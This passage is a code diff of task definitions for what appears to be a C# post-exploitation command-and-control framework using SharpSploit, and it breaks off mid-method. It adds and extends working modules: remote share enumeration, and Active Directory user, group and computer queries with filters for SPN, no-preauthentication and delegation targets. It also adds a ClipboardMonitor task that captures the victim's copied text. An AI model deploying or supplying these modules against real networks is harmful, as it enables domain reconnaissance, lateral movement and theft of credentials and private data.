@@ -424,13 +424,118 @@
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
-- Name: GetDomainGroup
+- Name: GetNetShares
   Aliases: []
-  Description: Gets a list of specified (or all) group `DomainObject`s in the current Domain.
+  Description: Gets a list of `Share`s from specified remote computer(s).
   Author: 
       Name: Ryan Cobb
       Handle: cobbr_io
       Link: https://twitter.com/cobbr_io
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.Collections.Generic;
+    using System.Linq;
+    using System.Text;
+
+    using SharpSploit.Enumeration;
+
+    public static class Task
+    {
+      public static string Execute(string Computers = ""){
+        String[] targets = Computers.Replace(", ",",").Split(',').ToArray();
+        StringBuilder results = new StringBuilder();
+
+
+            List<Net.ShareInfo> allshares = Net.GetNetShares(targets);
+            var groupedShares = allshares.GroupBy(grouping => grouping.ComputerName);
+
+
+            foreach(var group in groupedShares){
+              results.AppendLine("Shares on " + group.Key + ":\r\n---------------------------");
+                foreach(var s in group){
+                  results.AppendLine(s.ShareName + "\t\t" + s.ShareRemark);
+                }
+                results.AppendLine();
+            }
+        return results.ToString();
+      }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerNames
+    Value: DC01
+    DefaultValue: ''
+    Description: List of comma-delimited ComputerNames to query.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: GetDomainGroup
+  Aliases: []
+  Description: Gets a list of specified (or all) group `DomainObject`s in the current Domain.
+  Author:
+    Name: Ryan Cobb
+    Handle: cobbr_io
+    Link: https://twitter.com/cobbr_io
   Help: 
   Language: CSharp
   CompatibleDotNetVersions:
@@ -446,25 +551,28 @@
 
     public static class Task
     {
-        public static string Execute(string Identities = "")
+        public static string Execute(string Identities = "", string LDAPFilter = "", string Properties = null, string AdminCount = "false", string GroupScope = "", string GroupProperty = "", string FindOne = "0")
         {
             try
             {
                 List<Domain.DomainObject> domainGroups = new List<Domain.DomainObject>();
-                if (Identities.Trim() != "")
+                List<string> identityList = Identities.Split(',').ToList();
+                List<string> PropertyList = null;
+
+                if (Properties != null && Properties.Trim() != "")
                 {
-                    List<string> identityList = Identities.Split(',').ToList();
-                    domainGroups = new Domain.DomainSearcher().GetDomainGroups(identityList);
+                    PropertyList = Properties.Split(',').ToList();	
                 }
-                else
-                {
-                    domainGroups = new Domain.DomainSearcher().GetDomainGroups();
-                }
+
+                domainGroups = new Domain.DomainSearcher().GetDomainGroups(identityList, LDAPFilter, PropertyList, bool.Parse(AdminCount), GroupScope, GroupProperty, bool.Parse(FindOne));
+
                 StringBuilder results = new StringBuilder();
                 foreach (Domain.DomainObject domainGroup in domainGroups)
                 {
                     results.Append(domainGroup.ToString());
+                    results.AppendLine(" ");
                     results.AppendLine("------");
+                    results.AppendLine(" ");
                 }
                 return results.ToString();
             }
@@ -476,69 +584,143 @@
   TokenTask: false
   Options:
   - Name: Identities
-    Value: Domain Admins
+    Value: ''
     DefaultValue: ''
     Description: List of comma-delimited groups to retrieve.
     SuggestedValues: []
     Optional: true
     DisplayInCommand: true
     FileOption: false
+  - Name: LDAPFilter
+    Value: ''
+    DefaultValue: ''
+    Description: LDAP Filter to use
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Properties
+    Value: ''
+    DefaultValue: ''
+    Description: List of comma-delimited properties to retrieve.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: AdminCount
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: GroupScope
+    Value: ''
+    DefaultValue: ''
+    Description: DomainLocal, NotDomainLocal,  Global, NotGlobal,  Universal, NotUniversal
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: GroupProperty
+    Value: ''
+    DefaultValue: ''
+    Description: Security, Distribution, CreatedBySystem, NotCreatedBySystem
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: FindOne
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
   ReferenceSourceLibraries:
   - Name: SharpSploit
     Description: SharpSploit is a library for C# post-exploitation modules.
-    Location: SharpSploit\SharpSploit\
+    Location: SharpSploit/SharpSploit/
     Language: CSharp
-    CompatibleDotNetVersions: *o0
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
     ReferenceAssemblies:
     - Name: System.Management.Automation.dll
-      Location: net35\System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
       DotNetVersion: Net35
     - Name: System.Management.dll
-      Location: net40\System.Management.dll
-      DotNetVersion: Net40
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
     - Name: System.Management.Automation.dll
-      Location: net40\System.Management.Automation.dll
-      DotNetVersion: Net40
-    - Name: System.IdentityModel.dll
-      Location: net40\System.IdentityModel.dll
-      DotNetVersion: Net40
-    - Name: System.dll
-      Location: net40\System.dll
-      DotNetVersion: Net40
-    - Name: System.DirectoryServices.dll
-      Location: net40\System.DirectoryServices.dll
-      DotNetVersion: Net40
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
     - Name: System.Core.dll
-      Location: net40\System.Core.dll
-      DotNetVersion: Net40
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
     - Name: mscorlib.dll
-      Location: net40\mscorlib.dll
-      DotNetVersion: Net40
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
     - Name: System.Management.dll
-      Location: net35\System.Management.dll
-      DotNetVersion: Net35
-    - Name: mscorlib.dll
-      Location: net35\mscorlib.dll
-      DotNetVersion: Net35
-    - Name: System.Core.dll
-      Location: net35\System.Core.dll
-      DotNetVersion: Net35
-    - Name: System.DirectoryServices.dll
-      Location: net35\System.DirectoryServices.dll
-      DotNetVersion: Net35
-    - Name: System.dll
-      Location: net35\System.dll
-      DotNetVersion: Net35
-    - Name: System.IdentityModel.dll
-      Location: net35\System.IdentityModel.dll
-      DotNetVersion: Net35
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
 - Name: GetDomainUser
   Aliases: []
   Description: Gets a list of specified (or all) user `DomainObject`s in the current Domain.
-  Author: 
+  Author:
       Name: Ryan Cobb
       Handle: cobbr_io
       Link: https://twitter.com/cobbr_io
@@ -552,30 +734,39 @@
     using System.Text;
     using System.Linq;
     using System.Collections.Generic;
-
+    
     using SharpSploit.Enumeration;
-
+    
     public static class Task
     {
-        public static string Execute(string Identities = "")
+        public static string Execute(string Identities = "", string LDAPFilter = "", string Properties = null, string UACFilter = null, string SPN = "false", string AllowDelegation = "false", string DisallowDelegation = "false", string AdminCount = "false", string TrustedToAuth = "false", string PreauthNotRequired = "false")
         {
             try
             {
                 List<Domain.DomainObject> domainUsers = new List<Domain.DomainObject>();
-                if (Identities.Trim() != "")
+                List<string> identityList = Identities.Split(',').ToList();
+                List<string> PropertyList = null;
+                List<Domain.UACEnum> UACFilterList = null;
+                
+                if (Properties != null && Properties.Trim() != "")
                 {
-                    List<string> identityList = Identities.Split(',').ToList();
-                    domainUsers = new Domain.DomainSearcher().GetDomainUsers(identityList);
+                	  PropertyList = Properties.Split(',').ToList();	
                 }
-                else
+                
+                if (UACFilter.Trim() != "")
                 {
-                    domainUsers = new Domain.DomainSearcher().GetDomainUsers();
+                    UACFilterList = UACFilter.Split(',').Select(x => (Domain.UACEnum)Enum.Parse(typeof(Domain.UACEnum), $"{x}")).ToList();
                 }
+                
+                domainUsers = new Domain.DomainSearcher().GetDomainUsers(identityList, LDAPFilter, PropertyList, UACFilterList, bool.Parse(SPN), bool.Parse(AllowDelegation), bool.Parse(DisallowDelegation), bool.Parse(AdminCount), bool.Parse(TrustedToAuth), bool.Parse(PreauthNotRequired));
+    
                 StringBuilder results = new StringBuilder();
                 foreach (Domain.DomainObject domainUser in domainUsers)
                 {
                     results.Append(domainUser.ToString());
+                    results.AppendLine(" ");
                     results.AppendLine("------");
+                    results.AppendLine(" ");
                 }
                 return results.ToString();
             }
@@ -587,72 +778,170 @@
   TokenTask: false
   Options:
   - Name: Identities
-    Value: username
+    Value: ''
     DefaultValue: ''
     Description: List of comma-delimited usernames to retrieve.
     SuggestedValues: []
     Optional: true
     DisplayInCommand: true
     FileOption: false
+  - Name: LDAPFilter
+    Value: ''
+    DefaultValue: ''
+    Description: ''
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Properties
+    Value: ''
+    DefaultValue: ''
+    Description: ''
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: UACFilter
+    Value: ''
+    DefaultValue: ''
+    Description: SCRIPT, ACCOUNTDISABLE, HOMEDIR_REQUIRED, LOCKOUT, PASSWD_NOTREQD, PASSWD_CANT_CHANGE, ENCRYPTED_TEXT_PWD_ALLOWED, TEMP_DUPLICATE_ACCOUNT, NORMAL_ACCOUNT, INTERDOMAIN_TRUST_ACCOUNT, WORKSTATION_TRUST_ACCOUNT, SERVER_TRUST_ACCOUNT, DONT_EXPIRE_PASSWORD, MNS_LOGON_ACCOUNT, SMARTCARD_REQUIRED, TRUSTED_FOR_DELEGATION, NOT_DELEGATED, USE_DES_KEY_ONLY, DONT_REQ_PREAUTH, PASSWORD_EXPIRED, TRUSTED_TO_AUTH_FOR_DELEGATION, PARTIAL_SECRETS_ACCOUNT
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: SPN
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: AllowDelegation
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: DisallowDelegation
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: AdminCount
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: TrustedToAuth
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: PreauthNotRequired
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
   ReferenceSourceLibraries:
   - Name: SharpSploit
     Description: SharpSploit is a library for C# post-exploitation modules.
-    Location: SharpSploit\SharpSploit\
+    Location: SharpSploit/SharpSploit/
     Language: CSharp
-    CompatibleDotNetVersions: *o0
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
     ReferenceAssemblies:
     - Name: System.Management.Automation.dll
-      Location: net35\System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
       DotNetVersion: Net35
     - Name: System.Management.dll
-      Location: net40\System.Management.dll
-      DotNetVersion: Net40
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
     - Name: System.Management.Automation.dll
-      Location: net40\System.Management.Automation.dll
-      DotNetVersion: Net40
-    - Name: System.IdentityModel.dll
-      Location: net40\System.IdentityModel.dll
-      DotNetVersion: Net40
-    - Name: System.dll
-      Location: net40\System.dll
-      DotNetVersion: Net40
-    - Name: System.DirectoryServices.dll
-      Location: net40\System.DirectoryServices.dll
-      DotNetVersion: Net40
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
     - Name: System.Core.dll
-      Location: net40\System.Core.dll
-      DotNetVersion: Net40
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
     - Name: mscorlib.dll
-      Location: net40\mscorlib.dll
-      DotNetVersion: Net40
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
     - Name: System.Management.dll
-      Location: net35\System.Management.dll
-      DotNetVersion: Net35
-    - Name: mscorlib.dll
-      Location: net35\mscorlib.dll
-      DotNetVersion: Net35
-    - Name: System.Core.dll
-      Location: net35\System.Core.dll
-      DotNetVersion: Net35
-    - Name: System.DirectoryServices.dll
-      Location: net35\System.DirectoryServices.dll
-      DotNetVersion: Net35
-    - Name: System.dll
-      Location: net35\System.dll
-      DotNetVersion: Net35
-    - Name: System.IdentityModel.dll
-      Location: net35\System.IdentityModel.dll
-      DotNetVersion: Net35
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
 - Name: GetDomainComputer
   Aliases: []
   Description: Gets a list of specified (or all) computer `DomainObject`s in the current Domain.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
+  Author:
+    Name: Ryan Cobb
+    Handle: cobbr_io
+    Link: https://twitter.com/cobbr_io
   Help: 
   Language: CSharp
   CompatibleDotNetVersions:
@@ -663,30 +952,39 @@
     using System.Text;
     using System.Linq;
     using System.Collections.Generic;
-
+    
     using SharpSploit.Enumeration;
-
+    
     public static class Task
     {
-        public static string Execute(string Identities = "")
+        public static string Execute(string Identities = "", string LDAPFilter = "", string Properties = null, string UACFilter = null, string Unconstrained = "false", string TrustedToAuth = "false", string Printers = "false", string SPN = "false", string OperatingSystem = "", string ServicePack = "", string SiteName = "", string FindOne = "false")
         {
             try
             {
                 List<Domain.DomainObject> domainComputers = new List<Domain.DomainObject>();
-                if (Identities.Trim() != "")
+                List<string> identityList = Identities.Split(',').ToList();
+                List<string> PropertyList = null;
+                List<Domain.UACEnum> UACFilterList = null;
+    
+                if (Properties != null && Properties.Trim() != "")
                 {
-                    List<string> identityList = Identities.Split(',').ToList();
-                    domainComputers = new Domain.DomainSearcher().GetDomainComputers(identityList);
+                	  PropertyList = Properties.Split(',').ToList();	
                 }
-                else
+                
+                if (UACFilter.Trim() != "")
                 {
-                    domainComputers = new Domain.DomainSearcher().GetDomainComputers();
+                    UACFilterList = UACFilter.Split(',').Select(x => (Domain.UACEnum)Enum.Parse(typeof(Domain.UACEnum), $"{x}")).ToList();
                 }
+    
+                domainComputers = new Domain.DomainSearcher().GetDomainComputers(identityList, LDAPFilter, PropertyList, UACFilterList, bool.Parse(Unconstrained), bool.Parse(TrustedToAuth), bool.Parse(Printers), SPN, OperatingSystem, ServicePack, SiteName, false, bool.Parse(FindOne));
+    
                 StringBuilder results = new StringBuilder();
                 foreach (Domain.DomainObject domainComputer in domainComputers)
                 {
                     results.Append(domainComputer.ToString());
+                    results.AppendLine(" ");
                     results.AppendLine("------");
+                    results.AppendLine(" ");
                 }
                 return results.ToString();
             }
@@ -698,62 +996,176 @@
   TokenTask: false
   Options:
   - Name: Identities
-    Value: DC01
+    Value: ''
     DefaultValue: ''
     Description: List of comma-delimited computers to retrieve.
     SuggestedValues: []
     Optional: true
     DisplayInCommand: true
     FileOption: false
+  - Name: LDAPFilter
+    Value: ''
+    DefaultValue: ''
+    Description: LDAP Filter to use
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Properties
+    Value: ''
+    DefaultValue: ''
+    Description: List of comma-delimited properties to retrieve.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: UACFilter
+    Value: ''
+    DefaultValue: ''
+    Description: SCRIPT, ACCOUNTDISABLE, HOMEDIR_REQUIRED, LOCKOUT, PASSWD_NOTREQD, PASSWD_CANT_CHANGE, ENCRYPTED_TEXT_PWD_ALLOWED, TEMP_DUPLICATE_ACCOUNT, NORMAL_ACCOUNT, INTERDOMAIN_TRUST_ACCOUNT, WORKSTATION_TRUST_ACCOUNT, SERVER_TRUST_ACCOUNT, DONT_EXPIRE_PASSWORD, MNS_LOGON_ACCOUNT, SMARTCARD_REQUIRED, TRUSTED_FOR_DELEGATION, NOT_DELEGATED, USE_DES_KEY_ONLY, DONT_REQ_PREAUTH, PASSWORD_EXPIRED, TRUSTED_TO_AUTH_FOR_DELEGATION, PARTIAL_SECRETS_ACCOUNT
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Unconstrained
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: TrustedToAuth
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Printers
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: SPN
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OperatingSystem
+    Value: ''
+    DefaultValue: ''
+    Description: Operating system to hunt.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: ServicePack
+    Value: ''
+    DefaultValue: ''
+    Description: Service Pack to hunt.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: SiteName
+    Value: ''
+    DefaultValue: ''
+    Description: Site Name to hunt.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: FindOne
+    Value: ''
+    DefaultValue: 'false'
+    Description: ''
+    SuggestedValues: [ "false", "true" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
   ReferenceSourceLibraries:
   - Name: SharpSploit
     Description: SharpSploit is a library for C# post-exploitation modules.
-    Location: SharpSploit\SharpSploit\
+    Location: SharpSploit/SharpSploit/
     Language: CSharp
-    CompatibleDotNetVersions: *o0
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
     ReferenceAssemblies:
     - Name: System.Management.Automation.dll
-      Location: net35\System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
       DotNetVersion: Net35
     - Name: System.Management.dll
-      Location: net40\System.Management.dll
-      DotNetVersion: Net40
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
     - Name: System.Management.Automation.dll
-      Location: net40\System.Management.Automation.dll
-      DotNetVersion: Net40
-    - Name: System.IdentityModel.dll
-      Location: net40\System.IdentityModel.dll
-      DotNetVersion: Net40
-    - Name: System.dll
-      Location: net40\System.dll
-      DotNetVersion: Net40
-    - Name: System.DirectoryServices.dll
-      Location: net40\System.DirectoryServices.dll
-      DotNetVersion: Net40
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
     - Name: System.Core.dll
-      Location: net40\System.Core.dll
-      DotNetVersion: Net40
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
     - Name: mscorlib.dll
-      Location: net40\mscorlib.dll
-      DotNetVersion: Net40
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
     - Name: System.Management.dll
-      Location: net35\System.Management.dll
-      DotNetVersion: Net35
-    - Name: mscorlib.dll
-      Location: net35\mscorlib.dll
-      DotNetVersion: Net35
-    - Name: System.Core.dll
-      Location: net35\System.Core.dll
-      DotNetVersion: Net35
-    - Name: System.DirectoryServices.dll
-      Location: net35\System.DirectoryServices.dll
-      DotNetVersion: Net35
-    - Name: System.dll
-      Location: net35\System.dll
-      DotNetVersion: Net35
-    - Name: System.IdentityModel.dll
-      Location: net35\System.IdentityModel.dll
-      DotNetVersion: Net35
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
@@ -2141,6 +2553,519 @@
     - Name: System.IdentityModel.dll
       Location: net35\System.IdentityModel.dll
       DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: ClipboardMonitor
+  Aliases: []
+  Description: Captures text content from clipboard
+  Author:
+    Name: Nick Muir
+    Handle: shellfarmer
+    Link: https://github.com/shellfarmer
+  Code: |
+    using System;
+    using System.IO;
+    using System.Text;
+    using System.Runtime.InteropServices;
+    using System.Threading;
+    using System.Windows.Forms;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+        public static string Execute(string Seconds = "0")
+        {
+            try
+            {
+                TextWriter realStdOut = Console.Out;
+                TextWriter realStdErr = Console.Error;
+                StreamWriter stdOutWriter = new StreamWriter(OutputStream);
+                StreamWriter stdErrWriter = new StreamWriter(OutputStream);
+                stdOutWriter.AutoFlush = true;
+                stdErrWriter.AutoFlush = true;
+                Console.SetOut(stdOutWriter);
+                Console.SetError(stdErrWriter);
+
+                int time = int.Parse(Seconds);
+                string output = Clipboard.StartClipboardMonitor(time);
+
+                Console.Out.Flush();
+                Console.Error.Flush();
+                Console.SetOut(realStdOut);
+                Console.SetError(realStdErr);
+                
+                OutputStream.Close();
+
+                return "";
+            }
+            catch (Exception e)
+            {
+                if (OutputStream != null)
+                {
+                  OutputStream.Close();
+                }
+                return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
+            }
+        }
+    }
+
+    /// <summary>
+    /// Clipboard allows for the monitoring of Clipboard text content.
+    /// </summary>
+    public class Clipboard
+    {
+        /// <summary>
+        /// Starts a clipboard monitor
+        /// </summary>
+        /// <author>Nick Muir (@_shellfarmer)</author>
+        /// <returns>String containing the captured clipboard contents, along with identification of what window they were copied from.</returns>
+        /// <param name="Seconds">The amount of time in seconds the clipboard monitor should run for before returning data.</param>
+        public static string StartClipboardMonitor(int Seconds)
+        {
+            Console.WriteLine(String.Format("[*] Starting Clipboard Monitor for {0} seconds.", Seconds));
+            Console.WriteLine();
+
+            if (Seconds <= 0)
+            {
+                NotificationForm form = new NotificationForm();
+                Application.Run(form);
+                Console.WriteLine(string.Format("[*] Finished Clipboard Monitor at {0:HH:mm:ss.fff}", DateTime.Now));
+                return "";
+            }
+            else
+            {
+                using (System.Timers.Timer timer = new System.Timers.Timer(Seconds * 1000))
+                {
+                    timer.Elapsed += (source, e) =>
+                    {
+                        Console.WriteLine(string.Format("[*] Finished Clipboard Monitor at {0:HH:mm:ss.fff}", DateTime.Now));
+                        timer.Stop();
+                        Application.Exit();
+                    };
+                    timer.Start();
+                    NotificationForm form = new NotificationForm();
+                    Application.Run(form);
+                    return "";
+                }
+            }
+        }
+
+        private class NotificationForm : Form
+        {
+            public NotificationForm()
+            {
+                SetParent(Handle, new IntPtr(-3));
+                AddClipboardFormatListener(Handle);
+            }
+
+            public string GetOutput()
+            {
+                return "";
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                if (m.Msg == 0x031D)
+                {
+                    Thread t = new Thread(() => {
+                        try
+                        {
+                            if (System.Windows.Forms.Clipboard.ContainsText())
+                            {
